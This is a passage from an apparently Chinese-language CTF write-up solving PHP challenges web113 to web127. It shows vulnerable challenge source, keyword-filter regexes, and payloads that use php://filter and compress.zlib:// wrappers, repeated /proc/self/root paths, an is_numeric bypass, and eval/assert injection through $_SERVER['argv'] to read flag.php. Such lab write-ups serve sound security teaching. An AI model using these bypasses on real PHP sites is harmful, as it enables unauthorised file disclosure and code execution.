class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用上一道题目的payload可以继续打</p><p><code>file=compress.zlib://flag.php</code></p><p>linux里<code>/proc/self/root</code>是指向根目录的，也就是如果在命令行中输入<code>ls /proc/self/root</code>，其实显示的内容是根目录下的内容<br>多次重复后绕过<code>is_file</code>。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>file<span class="token operator">=</span><span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span>proc<span class="token operator">/</span>self<span class="token operator">/</span>root<span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>flag<span class="token punctuation">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>至于为什么需要多次重复来绕过，可能是is_filr函数的特色吧</p><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"师傅们居然tql都是非预期 哼！"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> 师傅们居然tql都是非预期 哼！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>?file=php://filter/resource=flag.php</code></p><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"e"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> hacker<span class="token operator">!</span><span class="token operator">!</span><span class="token operator">!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>需要满足什么：num通过is_numeric的检测，并且不等于36，去空后依然不等于36，经过过滤方法后依然等于36</p><p>fuzz脚本：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'36'</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到：<code>%0C %2B(+) - . 0 1 2 3 4 5 6 7 8 9</code></p><p><a href="https://tool.oschina.net/commons?type=4" target="_blank" rel="noopener">ASCII对照表</a></p><p>payload：<code>%0C36</code></p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$c"</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处的php特性：在php中变量名字是由数字字母和下划线组成的，所以不论用post还是get传入变量名的时候都将空格、+、点、[转换为下划线，但是用一个特性是可以绕过的，就是当[提前出现后，后面的点就不会再被转义了，such as：<code>CTF[SHOW.COM</code>=&gt;<code>CTF_SHOW.COM</code></p><p>payload：<code>CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag</code></p><h2 id="web125"><a href="#web125" class="headerlink" title="web125"></a>web125</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token variable">$c</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$c"</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.net/manual/zh/reserved.variables.argv.php" target="_blank" rel="noopener">$argv</a>：传递给脚本的参数数组</p><p><a href="https://www.cnblogs.com/luomir/p/5129875.html" target="_blank" rel="noopener">详解 $_SERVER 函数中QUERY_STRING和REQUEST_URI区别(转)</a></p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span>：<span class="token number">1</span>、cli模式（命令行）下    第一个参数<span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>是脚本名，其余的是传递给脚本的参数<span class="token number">2</span>、web网页模式下    在web页模式下必须在php<span class="token punctuation">.</span>ini开启register_argc_argv配置项    设置register_argc_argv <span class="token operator">=</span> <span class="token function">On</span><span class="token punctuation">(</span>默认是Off<span class="token punctuation">)</span>，重启服务，<span class="token variable">$_SERVER</span><span class="token punctuation">[</span>‘argv’<span class="token punctuation">]</span>才会有效果    这时候的<span class="token variable">$_SERVER</span><span class="token punctuation">[</span>‘argv’<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span>‘<span class="token constant">QUERY_STRING</span>’<span class="token punctuation">]</span>    <span class="token variable">$argv</span><span class="token punctuation">,</span><span class="token variable">$argc</span>在web模式下不适用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们是在网页模式下的，注意重点：<br><code>$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]</code><br>而 <code>$_SERVER[‘QUERY_STRING’]</code> <strong>是获取查询语句，也就是?后面的语句</strong></p><p>举个例子</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span>‘<span class="token constant">QUERY_STRING</span>’<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>payload：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token punctuation">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token shell-comment comment"># POST</span><span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token punctuation">;</span> <span class="token shell-comment comment">#GET</span><span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token punctuation">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token shell-comment comment">#POST</span><span class="token operator">?</span><span class="token number">1</span><span class="token operator">=</span>flag<span class="token punctuation">.</span>php        <span class="token shell-comment comment">#GET</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web126"><a href="#web126" class="headerlink" title="web126"></a>web126</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'argv'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'fun'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'CTF_SHOW.COM'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fl0g'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">{</span>         <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$c"</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fl0g</span><span class="token operator">===</span><span class="token string">"flag_give_me"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>             <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php"><code class="language-php"><span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 断言：<span class="token constant">PHP</span> <span class="token number">5</span>bool <span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> string <span class="token variable">$description</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token constant">PHP</span> <span class="token number">7</span>bool <span class="token function">assert</span> <span class="token punctuation">(</span> mixed <span class="token variable">$assertion</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> Throwable <span class="token variable">$exception</span> <span class="token punctuation">]</span> <span class="token punctuation">)</span>如果 assertion 是字符串，它将会被 <span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">)</span> 当做 <span class="token constant">PHP</span> 代码来执行可见，eval和assert都可以将字符当作代码执行，只不过assert不需要严格遵从语法，比如语句末尾的分号可不加<span class="token operator">?</span><span class="token variable">$fl0g</span><span class="token operator">=</span>flag_give_me<span class="token constant">CTF_SHOW</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span><span class="token constant">CTF</span><span class="token punctuation">[</span><span class="token constant">SHOW</span><span class="token punctuation">.</span><span class="token constant">COM</span><span class="token operator">=</span><span class="token number">6</span><span class="token operator">&amp;</span>fun<span class="token operator">=</span><span class="token function">assert</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web127"><a href="#web127" class="headerlink" title="web127"></a>web127</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$ctf_show</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$url</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//特殊字符检测</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\&lt;|\,|\>|\.|\\\|\//'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span 